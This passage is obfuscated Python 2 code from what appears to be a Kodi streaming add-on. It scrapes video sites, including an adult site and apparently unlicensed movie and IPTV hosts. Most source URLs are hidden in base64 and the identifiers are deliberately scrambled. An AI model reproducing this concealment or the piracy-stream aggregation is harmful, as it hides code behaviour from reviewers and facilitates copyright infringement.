 OoOO0oo0o = re . compile ( '<meta itemprop="name" content="(.+?)".+?<meta itemprop="thumbnailUrl" content="(.+?)".+?<meta itemprop="embedUrl" content="(.+?)".+?<meta itemprop="description" content="(.+?)" />' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( '<div class="video new-video"><iframe width="766" height="431" src="(.+?)&iv_load_policy=3&showinfo=0&autohide=1"' , re . DOTALL ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , IIIIiI11I11 , url , IiiIIIiI1ii in OoOO0oo0o :
  IIi1I ( ( OO0ooOOO0OOO ) . replace ( '&#039;s' , '' ) , url . replace ( 'https://www.youtube.com/embed/' , '' ) , 8043 , IIIIiI11I11 )
 for url in II11i1I11Ii1i :
  i1i1i1IOOOOOo ( ( url ) . replace ( '//' , 'http://' ) )
  if 74 - 74: Oo / iIii1I11I1II1 . OoOoOO00 - Ooo00oOo00o
def i1i1i1IOOOOOo ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<link rel="canonical" href="(.+?)">  <link rel="stylesheet"' ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  IIi1I ( 'PLAY' , ( url ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , ii11iIi1I + 'documentary.png' )
  if 62 - 62: i11i1 / OoOoOO00 + I1IiI % oOO / I1IiI + ii11ii1ii
def IiI11I111 ( ) :
 oO0 = iI1 ( 'http://www.stream2watch.co/live-tv' )
 OoOO0oo0o = re . compile ( '<a href="(.+?)">.+?<img src="(.+?)" alt=".+?"/>.+?<span class="country_name">(.+?)<br />(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO , Ooo000O00 in OoOO0oo0o :
  I1111I1II11 ( ( OO0ooOOO0OOO + '[COLORgreen]' + Ooo000O00 + '[/COLOR]' ) , I1i11i , 8086 , IIIIiI11I11 )
  if 36 - 36: i11i1 % i11iIiiIii
def Iiii1Ii ( url ) :
 oO0 = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a class="front_channel_href" href="(.+?)" title=".+?">.+?<img class="front_channel_thumb" src="(.+?)" alt=".+?"/>.+?<span class="front_channel_name">(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 8087 , IIIIiI11I11 )
  if 62 - 62: i1IIi % I1IiI
def i1ii1I1IIIII ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'a id="code_.+?data-f-href="(.+?)" data-code-embed="">(.+?)</a>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  OoiiI1i111 ( url , OO0ooOOO0OOO )
  if 54 - 54: I1IiI - I1I1ii
def OoiiI1i111 ( url , name ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( "playStream\('.+?', '(.+?)'\);" , re . DOTALL ) . findall ( oO0 )
 for url in OoOO0oo0o :
  print url
  IIi1I ( '[COLORgreen]' + name + '[/COLOR]' , url , 222 , '' )
  if 65 - 65: I1I1ii . oOO + i11i1 / Oo + iI1Ii11iII1 % i1IIi
def iiiiIi1 ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3d3dy5zb2xpZS5vcmcvYWxpYnJhcnkvaW5kZXguaHRtbA==' ) )
 OoOO0oo0o = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( IIIII1II )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + I1i11i , 3002 , 'http://www.solie.org/alibrary/' + IIIIiI11I11 )
def ooiiI1IIIii ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + IIIIiI11I11 )
def iIOO0OOoooo0o ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<br><a href="([^"]*)">(.+?)</a>' ) . findall ( IIIII1II )
 IiIi1Ii = re . compile ( 'href="([^"]*)">Season(.+?)</a>' ) . findall ( IIIII1II )
 next = re . compile ( '<a href="([^"]*)">Episodes</a>' ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3004 , ii11iIi1I + 'classicmovies.png' )
 for url , OO0ooOOO0OOO in IiIi1Ii :
  I1111I1II11 ( '[COLORgreen]Season- ' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'classicmovies.png' )
 for url in next :
  I1111I1II11 ( '[COLORgreen]NEXT[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'Next.png' )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in II11i1I11Ii1i :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + IIIIiI11I11 )
def iiIIiI11II1 ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<iframe.+?src="([^"]*)"' ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  oooOo ( url )
def oooOo ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<meta property="og:video" content="([^"]*)"/>' ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  o00OOo ( url )
  if 79 - 79: Ooo0OO0oOO - OoOoOO00
def Ii1iiI1 ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2FsbC8=' ) )
 OoOO0oo0o = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , I1i11i , 8061 , ii11iIi1I + 'classicmovies.png' )
def o0ooOOoO0oO0 ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( "v.src = '([^']*)';" ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  o00OOo ( url )
  if 86 - 86: i1IIi / oO0O * OOOo0
def OOoO0OOoO0ooo ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2NsYXNzaWMtdHYv' ) )
 OoOO0oo0o = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , I1i11i , 8061 , ii11iIi1I + 'classictv.png' )
def ii11i1ii1 ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( "v.src = '([^']*)';" ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  o00OOo ( url )
  if 37 - 37: i11iIiiIii
def iI1i ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcw==' ) )
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)"> (.+?).m3u</a></li>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '-' , ' ' ) . replace ( '_' , ' ' ) , ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcy8=' ) ) + I1i11i , 8071 , ii11iIi1I + 'streams.png' )
def i11I ( url ) :
 oO0 = iI1 ( url )
 OoOO0oo0o = re . compile ( 'EXTINF:.+?,(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( oO0 )
 for OO0ooOOO0OOO , url in OoOO0oo0o :
  IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '_' , ' ' ) , ( url ) . strip ( ) , 404 , ii11iIi1I + 'streams.png' )
def o0oO0o0oo0O0 ( url ) :
 oO0 = iI1 ( url )
 OoOO0oo0o = re . compile ( 'EXTINF:(.+?),(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , OO0ooOOO0OOO , url in OoOO0oo0o :
  url = ( ( i1111 ( 'aHR0cDovL3BpZXN1c3R2Lm5ldDo4MDAwL2xpdmUv' ) ) + oO0o0o0ooO0oO + '/' + oo0o0O00 + url ) . strip ( )
  IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '_' , ' ' ) , url , 10012 , IIIIiI11I11 )
  if 98 - 98: iI1Ii11iII1 * iIii1I11I1II1 . oO0O * Oo / ii11ii1ii + oOO
def iiI1ii111 ( ) :
 O00ooOo ( 'Best Videos' , 'http://www.xvideos.com/best' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 O00ooOo ( 'Genres' , 'http://www.xvideos.com' , 10106 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 O00ooOo ( 'Recently Uploaded' , 'http://xvideos.com' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 O00ooOo ( 'Tags' , 'http://www.xvideos.com/tags' , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 O00ooOo ( 'Search' , '' , 10107 , ii11iIi1I + 'JIZBOX.png' , '' , '' , )
 if 97 - 97: O0 / i11i1 + OOooOOo . Ooo0OO0oOO % I1IiI - I1IiI
def i1IiI1Iiii ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 o0O0O = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( oO0 )
 for url in o0O0O :
  O00ooOo ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)"><b>(.+?)</b><span class="navbadge default"(.+?)</span>' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO , i1I1i111Ii in OoOO0oo0o :
  O00ooOo ( OO0ooOOO0OOO + ' - No of Videos : ' + ( i1I1i111Ii ) . replace ( '>' , '' ) , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 56 - 56: O0
def iIIIII1iI ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 o0O0O = re . compile ( 'href="([^"]*)">Next</a></li>' ) . findall ( oO0 )
 for url in o0O0O :
  O00ooOo ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10104 , ii11iIi1I + 'Next.png' , '' , '' )
 OoOO0oo0o = re . compile ( ':"([^"]*)".+?;</script></a></div></div><p class="profile-name"><a href="([^"]*)">(.+?)</a></p><p class="profile-counts">\n(.+?)\n' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , url , OO0ooOOO0OOO , iIi1II11i in OoOO0oo0o :
  O00ooOo ( OO0ooOOO0OOO + '--' + iIi1II11i , 'http://www.xvideos.com' + url + '#_tabVideos,videos-best' , 10105 , ( IIIIiI11I11 ) . replace ( 'http:\/\/' , 'http://' ) , '' , '' )
  if 8 - 8: i1IIi
  if 20 - 20: II1i1IiiIIi11 / i11i1
def I1111ii11IIII ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , url , OO0ooOOO0OOO , IiIi , IiIi1II111I in OoOO0oo0o :
  ooo00OOOooO ( OO0ooOOO0OOO + ' - Porn Quality : ' + IiIi1II111I + ' - ' + IiIi , 'http://www.xvideos.com' + url , 10108 , IIIIiI11I11 , IIIIiI11I11 , IiIi1II111I + ' - ' + IiIi )
 o00o = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( oO0 )
 for url in o00o :
  O00ooOo ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 45 - 45: ii11ii1ii + I1I1ii . II1i1IiiIIi11 . II1i1IiiIIi11
def iI1Iii11i1 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OOOoo = re . compile ( '<div class="main-categories">(.+?)</div>' , re . DOTALL ) . findall ( oO0 )
 o0O0O = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( oO0 )
 for url in o0O0O :
  O00ooOo ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10106 , ii11iIi1I + 'Next.png' , '' , '' )
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)" class="btn btn-default">(.+?)</a>' ) . findall ( str ( OOOoo ) )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  O00ooOo ( OO0ooOOO0OOO , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 34 - 34: Ooo0OO0oOO - oOO * Oo / OOooOOo
  if 19 - 19: ii11ii1ii
def IiIIii1iiI ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 ii1IiiII = ( Ooo0OOoOoO0 ) . replace ( ' ' , '+' ) . replace ( '&' , '&' )
 IIo0Oo0oO0oOO00 = ii1IiiII . lower ( )
 IiiI1II1II1i = 'http://www.xvideos.com/?k=' + IIo0Oo0oO0oOO00
 print IiiI1II1II1i + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 oO0 = i11iIIIIIi1 ( IiiI1II1II1i )
 OoOO0oo0o = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , I1i11i , OO0ooOOO0OOO , IiIi , IiIi1II111I in OoOO0oo0o :
  ooo00OOOooO ( OO0ooOOO0OOO + ' - Porn Quality : ' + IiIi1II111I + ' - ' + IiIi , 'http://www.xvideos.com' + I1i11i , 10108 , IIIIiI11I11 , IIIIiI11I11 , IiIi1II111I + ' - ' + IiIi )
 o00o = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( oO0 )
 for I1i11i in o00o :
  O00ooOo ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + I1i11i , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 1 - 1: O0
def I11II1i1 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'flv_url=(.+?)\;' ) . findall ( oO0 )
 for url in OoOO0oo0o :
  IiI1ii11I1 = ( url ) . replace ( '%3A' , ':' ) . replace ( '%2F' , '/' ) . replace ( '%3F' , '?' ) . replace ( '%3D' , '=' ) . replace ( '%26' , '&' ) . replace ( '&amp' , '' )
  I1i1iI ( IiI1ii11I1 )
  if 30 - 30: OOoo0OO0 % I1IiI / ii11ii1ii * O0 * oO0O . OOOo0
def I1i1iI ( url ) :
 oO0ooOO = xbmc . Player ( iIi11I11 ( ) )
 import urlresolver
 try : oO0ooOO . play ( url )
 except : pass
 if 40 - 40: iIii1I11I1II1
 if 92 - 92: I1IiI % O0
def oo00ooooOOo00 ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5nb2Zpc2hpbmcuY28udWsvQW5nbGluZy1UaW1lcy9TZWN0aW9uL1ZpZGVvcy8=' ) )
 OoOO0oo0o = re . compile ( 'class="item.+?"><a href="(.+?)">(.+?)</a></li>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( 'http://www.gofishing.co.uk' + I1i11i ) . replace ( 'http://www.gofishing.co.ukhttp://www.gofishing.co.uk' , 'http://www.gofishing.co.uk' ) , 8091 , ii11iIi1I + 'gofish.png' )
def ii1iOO00Oooo000 ( url ) :
 oO0 = iI1 ( url )
 OoOO0oo0o = re . compile ( '<h2><a id=.+?href="([^"]*)">(.+?)</a></h2>' , re . DOTALL ) . findall ( oO0 )
 II11i1I11Ii1i = re . compile ( '<h3><a href="([^"]*)" id=.+?>(.+?)</a> </h3>.+?<img src="([^"]*)"' , re . DOTALL ) . findall ( oO0 )
 next = re . compile ( 'href="([^"]*)">next</a>&gt;</li>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , ii11iIi1I + 'gofish.png' )
 for url , OO0ooOOO0OOO , IIIIiI11I11 in II11i1I11Ii1i :
  IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , 'http://www.gofishing.co.uk/' + IIIIiI11I11 )
 for url in next :
  I1111I1II11 ( '[COLORgreen]NEXT[/COLOR]' , url . replace ( ' ' , '+' ) , 8091 , ii11iIi1I + 'Next.png' )
def iI1ii111iiIii ( url ) :
 oO0 = iI1 ( url )
 OoOO0oo0o = re . compile ( 'src="https://www.youtube.com/embed/(.+?)"' ) . findall ( oO0 )
 for url in OoOO0oo0o :
  yt . PlayVideo ( url )
  if 57 - 57: OOooOOo / I1I1ii
def iiIiII ( url ) :
 IIiiiI1iI = urllib2 . Request ( url )
 IIiiiI1iI . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 O0O0 = ''
 oo0OoOOO0o0 = ''
 try :
  O0O0 = urllib2 . urlopen ( IIiiiI1iI )
  oo0OoOOO0o0 = O0O0 . read ( )
  O0O0 . close ( )
 except : pass
 if oo0OoOOO0o0 != '' :
  return oo0OoOOO0o0
 else :
  oo0OoOOO0o0 = 'Failed'
  return oo0OoOOO0o0
  if 70 - 70: i11i1 * Ooo0OO0oOO / OOOo0 * I1IiI * OOOo0
OOoO0o = '{PQ},' ; O00Oo = '{SC},' ; iiiO0ooO0O0Ooo0o = '{XG},' ; IIi11IIiIi1i = '{JP},' ; Iii = '{HW},' ; Ooo0o0ooooOOo = '{RT},'
def oOoOO0000oO00 ( ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 O0o = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 I1i11i = ( i1111 ( 'aHR0cDovL2RsNC5tb3ZpZWZhcnNpLmNvbS9maWxtLzIwMTUtNy8=' ) )
 I1III1111iIi = ( i1111 ( 'aHR0cDovL2RsLmF2YWRsLmNvbS9OZXcvTW92aWUv' ) )
 OooOo0oo0O0o00O = ( i1111 ( 'aHR0cDovLzIxNy4yMTkuMTQzLjEwOC8xMzI3Lw==' ) )
 if 47 - 47: Ooo0OO0oOO + iIii1I11I1II1 . I1IiI
 iIo00OOOOOo0OOo = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvbW92L2FsbC5waHA=' ) )
 i1II11I11ii1 = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 OOoO0oO00o = ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL3NlYXJjaC8/cT0=' ) ) + Ooo0OOoOoO0
 OOO0OoO0oo0OO = ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21vdmllcy9hbGxtb3ZpZS5waHA=' ) )
 i1iI1Ii11Ii1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbG1vdmllcy5waHA=' ) )
 o0OoO0oo0O0o = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tb3ZmdWxsLnBocA==' ) )
 ii1III1iiIi = ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL1NILnBocA==' ) )
 if 35 - 35: i11i1 + O0 . i11iIiiIii % ii11ii1ii
 Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Checking Sources" , '' , 'Please Wait' )
 oO0 = iiIiII ( I1i11i )
 Oo0oO0ooo . update ( 0 , "" , "Checking Source 1/9 Links" )
 Iiii1iI1i = iiIiII ( I1III1111iIi )
 Oo0oO0ooo . update ( 14 , "" , "Checking Source 2/9 Links" )
 ooO000OO = iiIiII ( OooOo0oo0O0o00O )
 Oo0oO0ooo . update ( 28 , "" , "Checking Source 3/9 Links" )
 if 43 - 43: oOO * I1I1ii % i11i1
 Oo0oO0ooo . update ( 40 , "" , "Checking Source 4/9 Links" )
 iiiI11 = iiIiII ( iIo00OOOOOo0OOo )
 Oo0oO0ooo . update ( 52 , "" , "Checking Source 5/9 Links" )
 o0o00OOOO = iiIiII ( OOoO0oO00o )
 Oo0oO0ooo . update ( 64 , "" , "Checking Source 6/9 Links" )
 i11iIi1iIIIIi = iiIiII ( OOO0OoO0oo0OO )
 Oo0oO0ooo . update ( 76 , "" , "Checking Source 7/9 Links" )
 I1111iiiII1Ii = iiIiII ( i1iI1Ii11Ii1 )
 Oo0oO0ooo . update ( 88 , "" , "Checking Source 8/9 Links" )
 oO0oOoOoo0 = iiIiII ( o0OoO0oo0O0o )
 Oo0oO0ooo . update ( 100 , "" , "Checking Source 9/9 Links" )
 o0o000o = iiIiII ( ii1III1iiIi )
 if 26 - 26: iIii1I11I1II1 * OOooOOo . OOoo0OO0
 if 10 - 10: I1I1ii * Ooo0OO0oOO % Oo - OOoo0OO0 % Oo
 if oO0 != 'Failed' :
  OoOO0oo0o = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( oO0 )
  for O0oooo000oO0 , OO0ooOOO0OOO in OoOO0oo0o :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source 1[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( I1i11i + O0oooo000oO0 ) , 222 , '' )
    Oo0oO0ooo . update ( 0 , "" , "Getting Source 1 Links" )
 if Iiii1iI1i != 'Failed' :
  II11i1I11Ii1i = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( Iiii1iI1i )
  for O0oooo000oO0 , OO0ooOOO0OOO in II11i1I11Ii1i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source 2[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( I1III1111iIi + O0oooo000oO0 ) , 222 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 9 , "" , "Getting Source 2 Links" )
 if ooO000OO != 'Failed' :
  I1I1Iiii1 = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( ooO000OO )
  for O0oooo000oO0 , OO0ooOOO0OOO in I1I1Iiii1 :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source 3[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( OooOo0oo0O0o00O + O0oooo000oO0 ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 18 , "" , "Getting Source 3 Links" )
    if 96 - 96: O0 . II1i1IiiIIi11 - OOOo0 * Oo
    if 68 - 68: Ooo0OO0oOO - Oo / I1IiI - I1I1ii . II1i1IiiIIi11
    if 50 - 50: iIii1I11I1II1 - II1i1IiiIIi11 - OOoo0OO0
    if 60 - 60: iIii1I11I1II1 * oOO
    if 71 - 71: I1IiI % Oo % oOO
    if 34 - 34: OOoo0OO0 / OOoo0OO0 % iI1Ii11iII1 . I1IiI / Oo
    if 99 - 99: oOO * OOOo0 - oOO % oO0O
 if iiiI11 != 'Failed' :
  I1i1I = [ ]
  I111Iii1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( iiiI11 )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in I111Iii1 :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    if OO0ooOOO0OOO in I1i1I :
     pass
    else :
     O00OOOoOoo0O ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Scooby[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , I1i11i , 1016 , IiI , ii , oOoO00o )
     I1i1I . append ( OO0ooOOO0OOO )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 36 , "" , "Getting Scooby Links" )
     Oo0oO ( 'tvshows' , 'Media Info 3' )
 if o0o00OOOO != 'Failed' :
  i11i = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( o0o00OOOO )
  for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in i11i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Snag[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + I1i11i , 7067 , IIIIiI11I11 )
    Oo0oO0ooo . update ( 45 , "" , "Getting Snag Links" )
    if 73 - 73: oOO % oOO . II1i1IiiIIi11 + I1I1ii
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if i11iIi1iIIIIi != 'Failed' :
  Ii1I = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( i11iIi1iIIIIi )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in Ii1I :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    ooo00OOOooO ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Redemption[/COLOR]' ) , I1i11i , 222 , IiI , ii , oOoO00o )
